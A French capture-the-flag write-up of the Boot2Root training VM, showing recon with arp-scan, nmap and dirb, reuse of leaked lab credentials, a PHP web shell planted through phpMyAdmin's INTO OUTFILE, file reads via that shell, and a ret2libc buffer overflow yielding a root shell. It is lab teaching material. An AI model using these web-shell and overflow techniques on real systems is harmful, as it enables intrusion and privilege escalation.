# Boot2Root

Challenge Securité : Cherchez en groupe les différents moyens de passer root sur l'ISO fournie en ressources.

## Débuter avec la VM

On lance la VM

On n'a pas d'informations, on cherche alors à trouver l'adresse IP de la VM

On remarque que dans les configs de la VM, on a l'adresse MAC (Réseau->avancé)

```bash
arp-scan -l
```

va afficher : (pour Marie : sudo arp-scan --interface=en0 --localnet)

            Interface: en0, type: EN10MB, MAC: f0:18:98:5c:ac:dd, IPv4: 192.168.0.19
            Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
            192.168.0.30	08:00:27:16:fc:a0	PCS Systemtechnik GmbH    //*********************Correspond à l'adresse MAC
            192.168.0.18	98:09:cf:93:62:fc	OnePlus Technology (Shenzhen) Co., Ltd
            192.168.0.254	00:24:d4:a4:ee:30	FREEBOX SAS

            530 packets received by filter, 0 packets dropped by kernel
            Ending arp-scan 1.9.7: 256 hosts scanned in 1.870 seconds (136.90 hosts/sec). 3 responded

On regarde ensuite quels ports sont ouverts avec :

```bash
nmap -v -A [IP]
```

On voit que les ports suivants sont présents :

```bash
22/tcp  open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1.7 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http       Apache httpd 2.2.22 ((Ubuntu))
```

on essaye donc de rentrer l'ip dans le navigateur et on obtient le site

Mais on ne peut rien faire dessus

## Le site / Dirb

On part donc dans de grandes recherches, parmi celles-ci, on cherche à trouver les fichiers cachés du site.

Je trouve dirsearch : mais après moults essais, on n'arrive pas à le faire fonctionner, on se tourne donc vers un site proposant des équivalents :
https://blog.sec-it.fr/en/2021/02/16/fuzz-dir-tools/

Le premier proposé est dirb

Effectivement après installation avec :

```bash
            cd ~/Applications
            wget https://downloads.sourceforge.net/project/dirb/dirb/2.22/dirb222.tar.gz
            tar -xvf dirb222.tar.gz
            rm dirb222.tar.gz
            brew install autoconf
            chmod -R 755 dirb222
            cd dirb222
            ./configure
            make
            make install
```

On peut lancer dirb comme suit :

```bash
dirb http://192.168.0.30/ wordlists/common.txt
```

On obtient alors :

```bash
            GENERATED WORDS: 4612

            ---- Scanning URL: http://192.168.0.30/ ----
            + http://192.168.0.30/cgi-bin/ (CODE:403|SIZE:288)
            ==> DIRECTORY: http://192.168.0.30/fonts/
            + http://192.168.0.30/forum (CODE:403|SIZE:285)
            + http://192.168.0.30/index.html (CODE:200|SIZE:1025)
            + http://192.168.0.30/server-status (CODE:403|SIZE:293)

            ---- Entering directory: http://192.168.0.30/fonts/ ----
            (!) WARNING: Directory IS LISTABLE. No need to scan it.
                (Use mode '-w' if you want to scan it anyway)
```

Dirb a scanné le site et a trouvé des répertoires cachés, le seul auquel nous avons accès actuellement est http://192.168.0.30/forum
/!\ il faut passer le site en httpS !

## Le Forum

Quand on se connecte sur le forum, on peut voir différents sujets inutiles, et un très intéressant :
Probleme login ?

Quand on l'ouvre on se rend compte que ce sont des retours de commandes, parmi ceux-ci se trouve :

```bash
            Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
            Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Received disconnect from 161.202.39.38: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]
            Oct 5 08:46:01 BornToSecHackMe CRON[7549]: pam_unix(cron:session): session opened for user lmezard by (uid=1040)
```

on essaye donc de se connecter sur la VM mais ça ne marche pas, on essaye donc de se connecter simplement au forum :

````bash
            Id = lmezard
            mdp = !q\]Ej?*5K5cy*AJ    (la personne s'est sûrement trompée et a rentré son mot de passe en login)

Ca marche ! On arrive alors sur sa page profil et on obtient son adresse email =
```bash
laurie@borntosec.net
````

On ne sait pas trop quoi faire de plus, on voit bien un espace Users et contact mais rien de croustillant

## Webmail

Etant donné que nous avons dû passer le site en https, on rééssaye la commande dirb avec le https

```bash
dirb https://192.168.0.30/ wordlists/common.txt

            GENERATED WORDS: 4612

            ---- Scanning URL: https://192.168.0.30/ ----
            + https://192.168.0.30/cgi-bin/ (CODE:403|SIZE:289)
            ==> DIRECTORY: https://192.168.0.30/forum/
            ==> DIRECTORY: https://192.168.0.30/phpmyadmin/                 //NOUVELLE PAGE
            + https://192.168.0.30/server-status (CODE:403|SIZE:294)
            ==> DIRECTORY: https://192.168.0.30/webmail/                   //NOUVELLE PAGE

            ---- Entering directory: https://192.168.0.30/forum/ ----
            + https://192.168.0.30/forum/backup (CODE:403|SIZE:293)
            + https://192.168.0.30/forum/config (CODE:403|SIZE:293)
            ==> DIRECTORY: https://192.168.0.30/forum/images/
            ==> DIRECTORY: https://192.168.0.30/forum/includes/
            + https://192.168.0.30/forum/index (CODE:200|SIZE:4935)
            + https://192.168.0.30/forum/index.php (CODE:200|SIZE:4935)
            ==> DIRECTORY: https://192.168.0.30/forum/js/
            ==> DIRECTORY: https://192.168.0.30/forum/lang/
            ==> DIRECTORY: https://192.168.0.30/forum/modules/
            ==> DIRECTORY: https://192.168.0.30/forum/templates_c/
            ==> DIRECTORY: https://192.168.0.30/forum/themes/
            ==> DIRECTORY: https://192.168.0.30/forum/update/
```

On essaye d'aller sur https://192.168.0.30/webmail/

On obtient une page login, on peut se connecter avec les identifiants de Laurie :

```bash
Id : laurie@borntosec.net
Mot de passe : !q\]Ej?*5K5cy*AJ
```

On tombe sur sa boite mail avec deux mails :
L'un d'entre eux est : DB Access et contient :

```bash
            Hey Laurie,

            You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$

            Best regards.
```

## PhpMyAdmin

Maybe sur la page https://192.168.0.30/phpmyadmin/ ?

Les identifiants ont marché, on voit qu'il y a une base de données : forum_db

En se connectant sur phpmyadmin en tant que root, on peut utiliser la fenetre de commandes sql.
Quand on regarde la structure de mylittleforum, il y a un dossier templates_c. Quand on navigue dessus, on voit plusieurs fichiers php sur lesquels on peut naviguer.
Si on arrive a creer une page php ici on pourra lui faire executer des commandes.
Dans la fenetre de commandes SQL on lance :

```bash
SELECT "<?php system($GET_['exploit']) ?>" INTO OUTFILE "/var/www/forum/templates_c/exploit.php"
```

Cela cree le ficher exploit.php sur lequel on peut naviguer et auquel on peut passer des commandes dans l'URL

En fouillant dans le serveur, on fini par tomber sur :

```bash
https://192.168.56.3/forum/templates_c/exploit.php?exploit=ls%20/home
LOOKATME ft_root laurie laurie@borntosec.net lmezard thor zaz
https://192.168.56.3/forum/templates_c/exploit.php?exploit=ls%20/home/LOOKATME
password
https://192.168.56.3/forum/templates_c/exploit.php?exploit=cat%20/home/LOOKATME/password
lmezard:G!@M6f4Eatau{sF"
```

Avec cet identifiant et ce mot de passe, on peut se connecter sur la VM
Dans le home de lmezard, il y a un fichier `fun` et un ficher `README` qui nous challenge a trouver la solution du probleme.

Le fichier fun comporte des strings, des noms de fichiers, etc. La string ustar revient souvent, et on en deduit que le fichier est un fichier tar.

```bash
`tar -C /tmp -xvf fun`
```

Et on obtient plein de fichiers. Certains comportent des strings interessantes : "getme()". On trouve :

```bash
            grep -A2 getme /tmp/ft_fun/*
```

les fonctions getme retournent un caractere qui est ensuite print et pour lequel on nous dit d'utiliser SHA-256
Certaines fonctions sont sur plusieurs fichiers, et dans ce cas il faut se ficher au numero de fichier inclu dans le contenu du fichier et regarder le ficher suivant.

On peut aussi "concatenate" les lignes de code en un fichier .c en utilisant un script python (voir read_fun.py) et l'executer :

```bash
MY PASSWORD IS: Iheartpwnage
Now SHA-256 it and submit%
````

EN utlisant SHA-256, on obtient :

```bash
Iheartpwnage => 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
```

ssh laurie@192.168.0.30 -p 22
mdp : 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4

## Laurie

il y a un fichier bomb que l'on execute :
Après avoir testé différentes méthodes, on a retenu Ghidra :

On récupère le fichier avec scp -P 22 laurie@192.168.0.30:bomb .

Les réponses aux 6 phases sont :

### Phase 1

Phase 1 :

```bash
Public speaking is very easy.
```

Note : on le trouve directement en faisant un string ou dans ghidra fonction Phase_1 avec le compare

### Phase 2

Phase 2 :

```bash
1 2 6 24 120 720
```

Note : on a fait le calcul u[i] = i x u[i - 1] avec u[0] = 1

### Phase 3

Phase 3 :

```bash
1 b 214
```

On sait que le milieu = b (indice) donc on essaye de trouver le premier chiffre qui correspondrait et on en deduit le dernier (ex avec les cases)

### Phase 4

Phase 4 :

```bash
9
```

Il fallait que ce soit égale à 55 donc on a fait un petit programme qui nous ressortira la valeur qui correspond (cf Phase_4_bomb.c)

### Phase 5

Phase 5 :

```bash
opekmq
```

En examinant la fonction on voit qu'il y a une recursive appliquée à la string entrée et qui la modifie
On cherche la string qui apres modification sera égale à giants
Le programme fait l'équivalence entre toutes les lettres
(cf Phase_5_bomb.c)

### Phase 6

Phase 6 :

```bash
4 2 6 3 1 5
```

On comprend qu'il doit y avoir 6 nombres et que ces 6 nombres sont compris entre 1 et 6 et sont uniques. L'indice nous indique que le premier nombre est 4.

En cherchant la valeur de node1 on se rend compte qu'il y a aussi node2, node3 etc.. et qu'ils sont comme chainés.
on prend alors la valeur de node1 qui est en hexa et on la convertie en decimal
https://decimal-to-binary.com/decimal-to-binary-converter-online.html

On obtient pour chaque :

```bash
node : hexa : decimal
1 : 000000fd : 253
2 : 000002d5 : 725
3 : 0000012d : 301
4 : 000003e5 : 997
5 : 000000d4 : 212
6 : 000001b0 : 432
```

On voit alors que n+1 doit etre inferieur à n donc ça donne 4 2 6 3 1 5 (DESC)

### Defused ?

La bomb est defused mais quand on tape le mdp pour Thor ça ne fonctionne pas :

```bash
Publicspeakingisveryeasy.126241207201b2149opekmq426315
```

Sur le slack, il est dit qu'il faut inverser 2 caracteres, donc en bruteforcant un peu on obtient le vrai mot de passe :

```bash
Publicspeakingisveryeasy.126241207201b2149opekmq426135
```

on peut donc se connecter

```bash
ssh thor@192.168.0.30 -p 22
Publicspeakingisveryeasy.126241207201b2149opekmq426135
```

## Thor

Une fois connecté, le README demande juste de résoudre l'exo et de s'en servir comme mdp pour zaz
Quand on cat on obtient un long texte avec à la fin "Can you digest the message? :)"

On comprends que c'est un algo de dessin et en tapant des bouts de code sur Google on trouve le "turtle" qui est, comme par hasard, le nom du fichier.

Samy nous a donc fait un super algo pour nous l'afficher ! (cf turtle_Samy.py)

On obtient SLASH

Le mot de passe ne passe pas pour zaz, on cherche donc digest message sur Google et on tombe sur... MD5 !

On fait donc le md5 de SLASH et on obtient : 646da671ca01bb5d84dbb5fb2238dc8e

## Zaz

On se connecte :

```bash
ssh zaz@192.168.0.30 -p 22
646da671ca01bb5d84dbb5fb2238dc8e
```

On suit le tutoriel de :
https://beta.hackndo.com/retour-a-la-libc/

```bash
            (gdb) r $(perl -e 'print "A"x140 . "\xef\xbe\xad\xde"')
                Starting program: /home/zaz/exploit_me $(perl -e 'print "A"x200 . "\xef\xbe\xad\xde"')
                perl: warning: Setting locale failed.
                perl: warning: Please check that your locale settings:
                    LANGUAGE = (unset),
                    LC_ALL = (unset),
                    LC_TERMINAL_VERSION = "3.3.12",
                    LC_CTYPE = "fr_FR.UTF-8",
                    LC_TERMINAL = "iTerm2",
                    LANG = "en_US.UTF-8"
                    are supported and installed on your system.
                perl: warning: Falling back to the standard locale ("C").
                AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ�

                Program received signal SIGSEGV, Segmentation fault.
                0x41414141 in ?? ()
            (gdb) p system
                $1 = {<text variable, no debug info>} 0xb7e6b060 <system>

            (gdb) find __libc_start_main,+99999999,"/bin/sh"
                0xb7f8cc58
                warning: Unable to access target memory at 0xb7fd3160, halting search.
                1 pattern found.

            (gdb) r "$(perl -e 'print "A"x140 . "\x60\xb0\xe6\xb7" . "OSEF" . "\x58\xcc\xf8\xb7"')"
                The program being debugged has been started already.
                Start it from the beginning? (y or n) y

                Starting program: /home/zaz/exploit_me "$(perl -e 'print "A"x140 . "\x60\xb0\xe6\xb7" . "OSEF" . "\x58\xcc\xf8\xb7"')"
                perl: warning: Setting locale failed.
                perl: warning: Please check that your locale settings:
                    LANGUAGE = (unset),
                    LC_ALL = (unset),
                    LC_TERMINAL_VERSION = "3.3.12",
                    LC_CTYPE = "fr_FR.UTF-8",
                    LC_TERMINAL = "iTerm2",
                    LANG = "en_US.UTF-8"
                    are supported and installed on your system.
                perl: warning: Falling back to the standard locale ("C").
                AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`��OSEFX��
            $(perl -e 'print "A"x140 . "\x60\xb0\xe6\xb7" . "OSEF" . "\x58\xcc\xf8\xb7"')) perl: warning: Setting locale failed.
                perl: warning: Please check that your locale settings:
                    LANGUAGE = (unset),
                    LC_ALL = (unset),
                    LC_CTYPE = "fr_FR.UTF-8",
                    LC_TERMINAL_VERSION = "3.3.12",
                    LC_TERMINAL = "iTerm2",
                    LANG = "en_US.UTF-8"
                    are supported and installed on your system.
                perl: warning: Falling back to the standard locale ("C").
                /bin/sh: 1: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`��OSEFX��: not found
            $ ./exploit_me $(perl -e 'print "A"x140 . "\x60\xb0\xe6\xb7" . "OSEF" . "\x58\xcc\xf8\xb7"')
                perl: warning: Setting locale failed.
                perl: warning: Please check that your locale settings:
                    LANGUAGE = (unset),
                    LC_ALL = (unset),
                    LC_CTYPE = "fr_FR.UTF-8",
                    LC_TERMINAL_VERSION = "3.3.12",
                    LC_TERMINAL = "iTerm2",
                    LANG = "en_US.UTF-8"
                    are supported and installed on your system.
                perl: warning: Falling back to the standard locale ("C").
                AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`��OSEFX��
            # whoami
                root
```

## We did it !
